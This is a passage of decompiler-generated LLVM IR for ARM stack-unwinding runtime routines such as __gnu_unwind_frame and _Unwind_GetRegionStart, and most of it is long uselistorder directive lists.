304, 305, 306, 307, 308, 309, 310, 311, 32, 22, 312, 313, 315, 316, 314, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 355, 356, 357, 358, 359, 370, 371, 33, 23, 372, 373, 375, 376, 374, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 24, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 494, 495, 496, 497 }
  uselistorder label %dec_label_pc_194e8, { 1, 0 }
  uselistorder label %dec_label_pc_19484, { 1, 0 }
  uselistorder label %dec_label_pc_19430, { 1, 0 }
  uselistorder label %dec_label_pc_19408, { 1, 0 }
  uselistorder label %dec_label_pc_19374, { 1, 0 }
  uselistorder label %dec_label_pc_19358, { 1, 0 }
  uselistorder label %dec_label_pc_1933c, { 1, 0 }
  uselistorder label %dec_label_pc_192ec, { 1, 0 }
  uselistorder label %dec_label_pc_192d0, { 1, 0 }
  uselistorder label %dec_label_pc_1924c, { 1, 0 }
  uselistorder label %dec_label_pc_19230, { 1, 0 }
  uselistorder label %dec_label_pc_1916c, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_1913c, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_19124, { 1, 0 }
  uselistorder label %dec_label_pc_19108, { 1, 0 }
  uselistorder label %dec_label_pc_18e6c.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_18f94, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_18f88, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18f7c, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_18f2c, { 1, 0 }
  uselistorder label %dec_label_pc_18f1c, { 1, 0 }
  uselistorder label %dec_label_pc_18ea8, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_19570 = add i32 %ucbp, 76
  %v2_19570 = inttoptr i32 %v1_19570 to i32*
  %v3_19570 = load i32, i32* %v2_19570, align 4
  %v1_19574 = add i32 %v3_19570, 4
  %v2_19574 = inttoptr i32 %v1_19574 to i32*
  %v3_19574 = load i32, i32* %v2_19574, align 4
  %v3_1957c = mul i32 %v3_19574, 256
  %v4_19584 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_1957c, i32* %v4_19584, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_195a4 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_195a4

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 313, 304, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 298, 305, 302, 50, 303, 51, 53, 52, 54, 297, 55, 56, 57, 0, 301, 1, 58, 59, 60, 61, 63, 64, 65, 62, 67, 68, 69, 66, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 83, 82, 81, 84, 85, 86, 87, 306, 88, 89, 90, 91, 92, 307, 93, 94, 95, 96, 308, 97, 98, 99, 100, 101, 102, 103, 105, 104, 106, 108, 107, 109, 309, 110, 310, 119, 114, 120, 115, 116, 111, 112, 121, 117, 113, 118, 122, 123, 124, 125, 126, 127, 128, 135, 132, 136, 133, 137, 134, 129, 130, 131, 138, 139, 140, 141, 151, 147, 142, 152, 148, 153, 149, 143, 144, 145, 154, 150, 146, 155, 156, 157, 158, 159, 160, 2, 161, 3, 170, 166, 171, 167, 162, 163, 164, 172, 168, 173, 169, 165, 174, 175, 176, 177, 178, 188, 189, 183, 190, 184, 179, 180, 185, 191, 186, 192, 187, 181, 182, 193, 194, 195, 196, 201, 199, 197, 202, 200, 198, 203, 204, 206, 208, 209, 207, 205, 210, 299, 311, 211, 213, 212, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 228, 226, 224, 229, 227, 225, 230, 231, 233, 235, 236, 234, 232, 237, 300, 312, 238, 240, 239, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 4, 253, 258, 265, 259, 266, 260, 254, 255, 267, 261, 256, 262, 268, 263, 257, 264, 269, 270, 271, 272, 273, 274, 279, 286, 280, 287, 281, 275, 276, 288, 282, 277, 283, 289, 284, 278, 285, 290, 291, 292, 293, 294, 295, 296 }
  uselistorder i32 4, { 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 112, 513, 514, 515, 516, 517, 5, 520, 521, 518, 519, 522, 6, 523, 524, 525, 526, 7, 543, 8, 527, 528, 529, 530, 531, 9, 532, 10, 533, 534, 535, 536, 537, 538, 539, 11, 540, 149, 541, 542, 544, 545, 546, 547, 12, 548, 13, 261, 262, 263, 264, 280, 281, 549, 242, 243, 445, 248, 265, 14, 15, 552, 16, 17, 95, 90, 91, 18, 553, 92, 554, 75, 19, 20, 93, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 21, 572, 573, 574, 575, 576, 577, 74, 578, 579, 580, 581, 582, 583, 22, 23, 94, 584, 273, 113, 271, 272, 266, 267, 268, 269, 270, 244, 245, 246, 247, 249, 250, 251, 252, 253, 254, 24, 255, 114, 256, 257, 258, 259, 260, 150, 274, 275, 276, 277, 278, 279, 25, 282, 283, 284, 285, 325, 326, 286, 287, 288, 585, 26, 151, 115, 152, 587, 27, 588, 153, 240, 586, 86, 496, 497, 498, 499, 154, 76, 449, 450, 451, 452, 453, 454, 155, 156, 28, 455, 456, 457, 458, 459, 460, 461, 462, 157, 447, 448, 420, 421, 422, 423, 424, 425, 426, 427, 428, 29, 429, 430, 431, 463, 30, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 158, 159, 160, 478, 479, 482, 485, 480, 481, 116, 161, 483, 66, 484, 486, 487, 488, 490, 162, 32, 31, 489, 163, 164, 165, 296, 33, 34, 35, 36, 166, 67, 37, 38, 327, 328, 329, 330, 331, 39, 332, 77, 550, 551, 215, 40, 41, 117, 297, 78, 233, 118, 234, 122, 123, 167, 235, 298, 299, 42, 300, 96, 119, 120, 230, 236, 237, 121, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 0, 231, 232, 238, 239, 124, 70, 69, 301, 87, 302, 43, 303, 44, 72, 71, 305, 45, 304, 306, 307, 312, 125, 314, 126, 315, 316, 313, 308, 127, 309, 310, 311, 289, 168, 290, 68, 46, 291, 292, 47, 293, 79, 88, 128, 294, 295, 406, 317, 85, 84, 83, 318, 129, 48, 49, 50, 51, 52, 53, 319, 81, 80, 320, 82, 130, 321, 322, 323, 169, 241, 131, 324, 54, 333, 334, 335, 170, 336, 337, 338, 339, 171, 172, 132, 340, 133, 341, 97, 342, 343, 344, 173, 345, 346, 174, 175, 347, 98, 348, 99, 349, 350, 176, 351, 352, 177, 178, 353, 134, 354, 100, 355, 179, 180, 181, 356, 357, 135, 101, 358, 359, 182, 360, 361, 362, 183, 184, 1, 136, 363, 102, 364, 365, 366, 185, 367, 368, 186, 187, 2, 137, 369, 103, 370, 104, 371, 372, 373, 374, 188, 375, 376, 189, 190, 377, 378, 138, 379, 3, 380, 105, 381, 139, 382, 383, 384, 385, 191, 386, 387, 192, 193, 388, 389, 140, 390, 4, 391, 106, 392, 141, 393, 194, 195, 196, 394, 395, 142, 107, 396, 397, 398, 399, 197, 400, 401, 198, 199, 144, 402, 143, 403, 108, 404, 109, 405, 407, 408, 409, 410, 411, 146, 412, 147, 413, 200, 414, 73, 415, 201, 202, 148, 416, 145, 417, 110, 418, 111, 419, 203, 55, 432, 204, 56, 433, 205, 57, 434, 206, 58, 435, 207, 59, 436, 208, 89, 60, 437, 438, 209, 61, 439, 210, 62, 440, 211, 63, 441, 212, 64, 442, 213, 65, 443, 444, 446, 491, 492, 493, 494, 495, 500, 214, 501, 502 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 757, 1355, 1356, 580, 1360, 1361, 1362, 1363, 621, 1364, 1365, 543, 559, 622, 1357, 1358, 1359, 1366, 581, 1367, 758, 298, 303, 301, 299, 304, 300, 302, 759, 760, 761, 762, 623, 624, 1368, 1369, 526, 765, 764, 763, 117, 119, 118, 120, 121, 116, 768, 767, 766, 112, 625, 626, 107, 1370, 102, 1371, 771, 770, 769, 87, 1372, 1373, 1374, 1375, 773, 772, 61, 63, 64, 62, 65, 113, 114, 535, 774, 391, 1045, 775, 392, 393, 394, 776, 98, 1046, 1047, 1048, 155, 154, 156, 157, 777, 55, 778, 13, 10, 11, 9, 12, 779, 586, 1018, 44, 45, 43, 52, 51, 1376, 560, 627, 1377, 1, 0, 780, 96, 91, 89, 90, 97, 94, 95, 92, 93, 88, 332, 628, 314, 781, 396, 397, 395, 544, 579, 545, 1299, 1300, 1301, 1302, 561, 782, 398, 784, 783, 399, 400, 1024, 785, 1049, 1050, 1051, 1379, 1053, 1052, 527, 786, 548, 1054, 549, 1380, 1020, 1019, 1381, 550, 1382, 1383, 1384, 1385, 1386, 1387, 980, 1388, 1389, 1390, 1391, 1392, 1393, 981, 750, 788, 787, 401, 405, 407, 403, 402, 404, 406, 408, 410, 409, 1058, 1055, 1056, 1057, 576, 551, 108, 109, 110, 111, 629, 1059, 1060, 1075, 1076, 789, 751, 25, 26, 1067, 982, 1068, 1069, 983, 1070, 1071, 1072, 1073, 1074, 137, 131, 132, 134, 138, 135, 133, 136, 130, 139, 1061, 1062, 1063, 630, 1064, 1065, 1066, 790, 485, 488, 486, 481, 489, 482, 484, 487, 483, 1077, 1078, 1079, 791, 258, 257, 254, 253, 252, 259, 255, 256, 260, 1080, 1081, 1082, 1083, 792, 321, 322, 320, 323, 324, 325, 793, 193, 1022, 631, 1021, 577, 796, 795, 794, 492, 498, 490, 494, 493, 497, 495, 496, 499, 491, 632, 1023, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 552, 797, 501, 500, 502, 505, 503, 504, 506, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 798, 140, 144, 146, 143, 141, 145, 142, 147, 633, 1035, 799, 103, 1084, 1085, 1086, 1087, 1088, 634, 800, 15, 16, 17, 19, 18, 635, 20, 801, 42, 41, 38, 39, 40, 36, 37, 802, 173, 174, 181, 182, 177, 178, 179, 180, 175, 176, 803, 76, 74, 75, 804, 411, 805, 49, 48, 806, 47, 46, 807, 172, 171, 808, 1175, 373, 376, 374, 375, 412, 69, 70, 809, 297, 296, 810, 100, 811, 812, 71, 72, 1394, 1395, 1396, 636, 1397, 1398, 637, 1399, 815, 814, 813, 183, 185, 191, 184, 189, 188, 192, 190, 186, 187, 816, 73, 638, 817, 413, 414, 415, 818, 422, 420, 421, 419, 416, 417, 418, 819, 57, 58, 56, 59, 60, 820, 821, 328, 823, 822, 158, 824, 106, 1348, 827, 826, 825, 104, 105, 828, 369, 371, 370, 372, 553, 829, 122, 520, 528, 1349, 830, 163, 160, 161, 162, 164, 159, 1350, 1351, 1352, 832, 831, 424, 423, 427, 431, 430, 428, 426, 432, 425, 433, 429, 101, 536, 1015, 1016, 1017, 833, 834, 546, 1152, 547, 1153, 1154, 537, 1155, 435, 439, 434, 437, 438, 441, 442, 440, 436, 1156, 1400, 562, 639, 836, 835, 837, 1304, 1307, 1308, 1309, 838, 443, 448, 449, 447, 446, 450, 444, 445, 1310, 1311, 1312, 1313, 839, 455, 461, 454, 460, 459, 453, 463, 462, 457, 451, 456, 452, 458, 1305, 1306, 640, 840, 66, 68, 67, 50, 1288, 641, 1289, 1290, 1291, 1292, 1293, 841, 361, 362, 360, 363, 1314, 153, 152, 1315, 1316, 1317, 1318, 1319, 1320, 587, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 643, 1329, 1330, 1331, 1332, 1333, 642, 1334, 1335, 1336, 1337, 1338, 842, 466, 468, 464, 467, 472, 475, 471, 473, 474, 469, 470, 465, 266, 265, 644, 645, 541, 846, 845, 844, 843, 129, 364, 554, 380, 847, 271, 270, 848, 343, 342, 849, 167, 850, 476, 851, 852, 477, 853, 285, 854, 478, 855, 856, 479, 857, 319, 318, 858, 169, 168, 859, 330, 329, 860, 861, 480, 862, 262, 261, 863, 864, 512, 865, 1202, 1203, 53, 54, 985, 986, 987, 988, 989, 990, 991, 1401, 125, 126, 127, 128, 866, 1176, 646, 123, 124, 1089, 867, 284, 283, 647, 1177, 868, 263, 264, 648, 869, 280, 278, 279, 1178, 870, 23, 22, 21, 871, 872, 149, 148, 873, 219, 874, 507, 875, 151, 150, 876, 317, 316, 877, 226, 879, 878, 165, 166, 881, 880, 326, 327, 344, 521, 1378, 382, 381, 1179, 1180, 1181, 1182, 534, 1183, 883, 882, 33, 32, 27, 30, 28, 29, 34, 35, 31, 1204, 555, 1205, 556, 1206, 885, 884, 508, 1184, 1185, 1186, 1187, 886, 1295, 1296, 563, 2, 531, 3, 1297, 1090, 1091, 1092, 649, 1188, 509, 1339, 377, 1190, 1189, 1191, 315, 1207, 1119, 1222, 887, 368, 367, 366, 365, 1208, 888, 211, 210, 209, 208, 650, 1010, 651, 1011, 588, 1012, 1120, 653, 1121, 1013, 997, 992, 655, 542, 993, 994, 656, 995, 996, 660, 998, 999, 1000, 657, 1001, 1002, 661, 1003, 1004, 658, 1005, 1006, 659, 654, 1007, 1008, 1009, 662, 663, 1014, 565, 664, 665, 1122, 1123, 1124, 666, 1125, 1126, 1127, 667, 564, 1128, 984, 1131, 1130, 652, 1129, 1132, 1133, 668, 1134, 1135, 1136, 566, 1143, 1144, 538, 669, 901, 900, 899, 898, 897, 896, 895, 894, 893, 892, 891, 890, 889, 276, 274, 275, 273, 277, 272, 1137, 1138, 670, 1139, 1140, 671, 1141, 1142, 239, 238, 237, 243, 240, 241, 242, 236, 235, 672, 673, 903, 902, 510, 511, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 522, 533, 1100, 1101, 567, 523, 1102, 1103, 1104, 1105, 524, 532, 1106, 1107, 568, 525, 1108, 674, 1109, 1110, 675, 1111, 676, 1112, 1113, 557, 1116, 1114, 1115, 529, 530, 1117, 677, 1118, 911, 753, 910, 909, 908, 907, 906, 905, 752, 904, 308, 309, 311, 310, 313, 307, 306, 312, 912, 305, 1280, 574, 558, 913, 85, 84, 83, 82, 86, 80, 78, 77, 79, 81, 1209, 915, 914, 349, 350, 348, 347, 346, 345, 351, 680, 589, 1145, 1146, 590, 1147, 1148, 678, 679, 681, 1149, 1150, 682, 683, 684, 685, 686, 687, 688, 928, 927, 926, 925, 924, 923, 922, 921, 920, 919, 756, 918, 917, 916, 294, 295, 293, 689, 539, 690, 929, 691, 692, 693, 696, 695, 694, 1151, 931, 930, 170, 697, 1157, 575, 1158, 1159, 698, 578, 699, 1160, 700, 1161, 701, 1162, 702, 1163, 703, 1164, 704, 1165, 705, 1166, 706, 1167, 707, 1168, 708, 1169, 709, 1170, 710, 1171, 711, 1172, 712, 1173, 713, 1174, 540, 714, 940, 939, 938, 937, 936, 935, 934, 933, 932, 203, 204, 206, 205, 207, 1192, 1198, 5, 569, 1193, 715, 1194, 4, 1195, 582, 1196, 570, 571, 1197, 1199, 1200, 583, 1201, 754, 944, 943, 755, 942, 941, 115, 1281, 591, 592, 1282, 6, 7, 8, 1210, 1211, 1212, 1213, 1214, 584, 585, 716, 1215, 1216, 717, 1217, 1218, 718, 1219, 1221, 1220, 948, 947, 946, 945, 229, 231, 233, 234, 232, 227, 230, 228, 1223, 1224, 1225, 719, 720, 950, 949, 221, 224, 225, 220, 223, 222, 1226, 1227, 1228, 721, 1229, 722, 594, 593, 723, 1230, 951, 246, 249, 250, 251, 248, 244, 247, 245, 1231, 1232, 724, 1233, 595, 572, 725, 952, 378, 379, 1234, 1235, 1236, 726, 1237, 727, 728, 1238, 596, 1239, 953, 384, 388, 389, 390, 387, 383, 386, 385, 1240, 1241, 1242, 729, 1243, 730, 598, 597, 731, 1244, 732, 1245, 954, 195, 199, 202, 200, 201, 194, 198, 196, 197, 1246, 1247, 1248, 1249, 1250, 733, 1251, 734, 1252, 735, 603, 602, 736, 1253, 599, 1254, 600, 1255, 601, 1256, 960, 959, 958, 957, 956, 955, 215, 216, 218, 217, 212, 214, 213, 1257, 1258, 1259, 1260, 1261, 737, 1262, 738, 1263, 739, 612, 611, 740, 1264, 610, 1265, 609, 1266, 604, 1267, 605, 1268, 606, 1269, 607, 1270, 608, 1271, 966, 965, 964, 963, 962, 961, 289, 290, 292, 291, 286, 288, 287, 1272, 1273, 741, 1274, 613, 573, 742, 967, 281, 282, 1275, 1276, 1277, 743, 616, 615, 744, 1278, 614, 1279, 968, 352, 353, 357, 358, 359, 356, 355, 354, 1283, 1284, 1285, 745, 619, 618, 746, 1286, 617, 1287, 973, 972, 971, 970, 969, 333, 334, 339, 340, 341, 338, 337, 336, 335, 1294, 620, 747, 974, 267, 268, 269, 1298, 975, 331, 1303, 976, 14, 1340, 1343, 748, 1344, 1345, 1341, 1342, 1346, 1347, 515, 516, 518, 517, 514, 519, 1353, 749, 977, 99, 1354, 24, 978, 979, 513 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_195d0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_195d8 = add i32 %tmp1, 72
  %v2_195d8 = inttoptr i32 %v1_195d8 to i32*
  %v3_195d8 = load i32, i32* %v2_195d8, align 4
  ret i32 %v3_195d8

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 9, 8, 11, 10, 170, 171, 172, 173, 15, 16, 64, 17, 174, 56, 12, 175, 176, 177, 178, 179, 181, 182, 180, 183, 184, 185, 186, 187, 188, 189, 18, 19, 20, 21, 23, 22, 24, 57, 58, 25, 26, 59, 60, 61, 62, 63, 65, 66, 86, 67, 68, 190, 6, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 3, 124, 125, 126, 127, 128, 27, 129, 147, 28, 29, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 166, 159, 160, 161, 162, 163, 164, 165, 167, 168, 30, 169, 4, 87, 88, 31, 89, 90, 91, 32, 69, 41, 51, 52, 53, 70, 71, 54, 42, 43, 44, 45, 46, 47, 48, 49, 50, 55, 33, 34, 35, 72, 73, 74, 7, 75, 76, 77, 78, 80, 81, 40, 82, 36, 83, 85, 84, 79, 5, 119, 92, 37, 93, 94, 95, 96, 97, 98, 99, 38, 100, 101, 102, 39, 103, 104, 105, 106, 107, 108, 13, 109, 110, 111, 112, 113, 114, 14, 115, 116, 117, 118, 120, 121, 122, 123, 0, 1, 2 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_195ec = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_195ec)
  %v31_195f4 = load i32, i32* @r0, align 4
  ret i32 %v31_195f4

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 241, 242, 243, 16, 41, 76, 87, 244, 247, 248, 67, 17, 245, 246, 223, 44, 8, 249, 9, 18, 77, 0, 78, 10, 11, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 1, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 79, 19, 68, 69, 70, 71, 72, 73, 74, 75, 80, 81, 82, 83, 84, 85, 86, 42, 239, 20, 240, 21, 22, 23, 24, 165, 166, 276, 277, 279, 57, 58, 59, 60, 25, 189, 190, 2, 26, 27, 92, 93, 3, 28, 29, 280, 281, 4, 30, 31, 209, 210, 5, 32, 33, 65, 66, 278, 150, 88, 225, 34, 54, 55, 226, 6, 227, 228, 229, 217, 52, 218, 219, 220, 53, 221, 222, 35, 237, 230, 231, 232, 233, 234, 235, 236, 94, 95, 211, 36, 212, 203, 37, 204, 199, 38, 200, 96, 39, 97, 205, 40, 206, 98, 47, 99, 100, 48, 49, 167, 168, 169, 170, 101, 43, 102, 45, 46, 171, 172, 173, 174, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 63, 134, 61, 62, 64, 135, 138, 139, 140, 141, 142, 143, 136, 137, 89, 90, 91, 51, 144, 145, 146, 147, 148, 149, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 175, 176, 177, 178, 179, 180, 181, 12, 182, 183, 184, 185, 186, 187, 188, 213, 214, 7, 191, 192, 193, 194, 195, 196, 197, 198, 201, 202, 207, 208, 215, 216, 224, 238, 56, 50 }
  uselistorder void (i32)* @__pseudo_branch, { 2, 69, 62, 63, 64, 65, 66, 67, 68, 70, 71, 72, 73, 18, 19, 20, 21, 22, 23, 14, 15, 16, 17, 24, 25, 26, 27, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 28, 29, 30, 74, 79, 80, 81, 82, 83, 84, 85, 75, 89, 90, 91, 92, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 40, 76, 77, 78, 86, 87, 88, 41, 42, 43, 0, 37, 38, 39, 44, 48, 49, 45, 46, 47, 1, 93, 31, 32, 33, 34, 35, 36, 60, 61 }
  uselistorder i32 0, { 422, 421, 485, 486, 1373, 426, 425, 487, 1374, 1375, 1376, 1377, 373, 372, 488, 1378, 1379, 207, 1380, 1382, 1383, 152, 153, 1384, 1385, 1381, 96, 97, 98, 99, 2, 1, 3, 0, 196, 195, 197, 198, 199, 1386, 423, 424, 146, 141, 1387, 1388, 201, 202, 200, 203, 1389, 1390, 1391, 1392, 206, 205, 204, 1393, 1394, 1395, 412, 411, 489, 427, 490, 428, 491, 429, 492, 493, 494, 154, 1396, 443, 442, 1397, 1398, 441, 440, 1399, 495, 438, 439, 436, 437, 435, 434, 1400, 433, 432, 431, 430, 380, 1401, 1417, 1402, 210, 1403, 1404, 1405, 1406, 1407, 1408, 212, 1410, 1411, 208, 209, 1412, 1413, 130, 155, 1414, 1415, 680, 100, 101, 413, 414, 211, 1409, 1416, 379, 1418, 496, 497, 1419, 445, 444, 213, 1420, 1421, 214, 1422, 1423, 1424, 112, 498, 499, 1425, 215, 1426, 156, 1427, 1428, 216, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 38, 131, 500, 1439, 217, 1440, 1441, 1442, 4, 1443, 1444, 5, 1445, 1446, 894, 895, 6, 147, 1447, 501, 1448, 808, 809, 810, 811, 812, 816, 813, 814, 815, 7, 381, 102, 817, 502, 818, 819, 820, 446, 447, 896, 897, 8, 503, 753, 504, 1449, 1450, 1451, 9, 10, 157, 158, 159, 1466, 1467, 11, 754, 160, 161, 1283, 1284, 1285, 1286, 218, 219, 1287, 763, 220, 132, 48, 1468, 103, 382, 1472, 1473, 49, 821, 113, 822, 823, 824, 383, 162, 1469, 1470, 1471, 384, 12, 1474, 1475, 1476, 1477, 1478, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1479, 1480, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 39, 1499, 1500, 1501, 1502, 1503, 40, 1504, 1505, 1506, 41, 1507, 1508, 1509, 42, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1536, 1537, 1538, 1539, 1540, 1541, 1542, 1534, 1535, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 43, 1553, 1554, 1555, 1556, 1557, 44, 1558, 1559, 1560, 1561, 1562, 45, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 221, 825, 681, 826, 827, 828, 829, 863, 505, 506, 864, 865, 163, 164, 165, 225, 830, 223, 831, 852, 845, 682, 846, 847, 848, 849, 50, 51, 116, 850, 851, 385, 853, 854, 683, 855, 222, 856, 52, 53, 115, 857, 858, 684, 859, 860, 54, 55, 114, 861, 224, 862, 166, 832, 685, 833, 834, 507, 835, 836, 686, 837, 838, 841, 839, 840, 386, 842, 56, 57, 118, 843, 687, 58, 59, 117, 844, 866, 688, 867, 868, 869, 870, 871, 872, 689, 873, 874, 875, 876, 756, 755, 389, 758, 759, 757, 387, 388, 760, 761, 508, 762, 764, 765, 690, 766, 767, 768, 691, 769, 770, 60, 61, 119, 771, 772, 773, 104, 105, 774, 775, 776, 226, 777, 778, 779, 780, 781, 509, 782, 783, 784, 785, 786, 787, 167, 790, 692, 791, 792, 62, 63, 121, 793, 794, 795, 693, 796, 797, 798, 799, 694, 800, 801, 64, 65, 120, 802, 803, 804, 805, 806, 227, 229, 788, 228, 789, 230, 807, 168, 877, 882, 883, 878, 879, 880, 885, 886, 887, 231, 888, 889, 890, 891, 892, 881, 884, 893, 169, 898, 899, 900, 510, 1022, 511, 901, 1452, 1453, 1454, 232, 1455, 1348, 1347, 1291, 1264, 1193, 903, 902, 904, 1023, 1024, 1025, 1578, 1579, 1580, 1581, 233, 1582, 1583, 1584, 1292, 1293, 409, 410, 512, 1589, 698, 1590, 513, 1591, 1592, 514, 1593, 1594, 696, 234, 391, 1595, 697, 1596, 515, 106, 1597, 1598, 516, 1613, 1614, 1617, 695, 390, 1618, 448, 171, 170, 1615, 1616, 1585, 1586, 699, 235, 374, 743, 13, 14, 1609, 1066, 922, 1608, 1242, 1349, 142, 237, 1350, 700, 236, 1351, 1352, 1599, 1600, 1601, 1602, 517, 1603, 172, 999, 1000, 66, 67, 122, 1353, 1354, 111, 393, 1358, 1355, 1356, 701, 1357, 1359, 702, 1360, 1361, 1362, 1363, 68, 69, 123, 1364, 238, 1365, 1366, 1367, 1369, 1368, 392, 744, 746, 745, 239, 747, 748, 749, 518, 750, 173, 1587, 1588, 1001, 1002, 1003, 1004, 1005, 1006, 241, 174, 1007, 1008, 1009, 143, 240, 1010, 175, 520, 521, 1604, 519, 176, 177, 1299, 1300, 1301, 1302, 1303, 242, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 243, 1294, 522, 1295, 1296, 523, 1297, 1298, 178, 703, 244, 245, 1265, 524, 246, 1266, 1267, 1268, 1269, 1270, 179, 254, 249, 247, 248, 251, 253, 256, 255, 250, 252, 1311, 1312, 1336, 1337, 180, 1313, 1314, 260, 258, 259, 1315, 1316, 266, 265, 191, 257, 1317, 1318, 1319, 1320, 1321, 1322, 416, 415, 449, 525, 1323, 1324, 1325, 107, 1326, 262, 261, 263, 264, 190, 1327, 1328, 394, 1329, 1330, 150, 1331, 1332, 1333, 1334, 1335, 15, 16, 923, 924, 108, 17, 450, 526, 1243, 1244, 1246, 181, 1245, 1218, 1217, 1195, 1194, 926, 925, 1011, 927, 928, 1220, 1219, 1221, 930, 929, 1288, 1619, 1620, 124, 182, 1026, 1027, 1028, 267, 905, 906, 183, 268, 1029, 1034, 1035, 1036, 1037, 269, 1030, 270, 1031, 1032, 1038, 527, 1196, 1605, 1606, 1607, 931, 933, 932, 1039, 934, 1370, 935, 936, 937, 1610, 1611, 1612, 1033, 18, 1456, 1457, 1458, 148, 1459, 1460, 1461, 1462, 1463, 271, 1464, 704, 707, 705, 706, 1465, 708, 192, 272, 1040, 1041, 144, 403, 1042, 1043, 273, 70, 274, 528, 938, 1044, 1045, 1046, 1273, 1272, 1274, 1275, 1276, 1277, 46, 275, 1278, 1279, 1280, 276, 133, 134, 483, 484, 907, 278, 277, 279, 1047, 280, 1048, 1049, 281, 1338, 1339, 529, 282, 1050, 283, 284, 1097, 285, 1067, 945, 939, 288, 940, 530, 941, 531, 735, 723, 724, 713, 725, 714, 726, 727, 715, 728, 716, 729, 717, 730, 718, 731, 732, 135, 71, 377, 378, 733, 719, 734, 736, 737, 738, 739, 740, 286, 287, 741, 742, 942, 709, 943, 532, 944, 396, 395, 946, 947, 948, 949, 290, 289, 950, 951, 952, 720, 375, 953, 125, 126, 376, 954, 127, 128, 533, 956, 957, 710, 958, 959, 960, 961, 962, 534, 963, 964, 404, 405, 193, 712, 965, 966, 967, 968, 969, 970, 711, 971, 972, 535, 973, 536, 974, 977, 978, 979, 291, 975, 292, 976, 293, 955, 908, 909, 910, 137, 72, 911, 136, 73, 912, 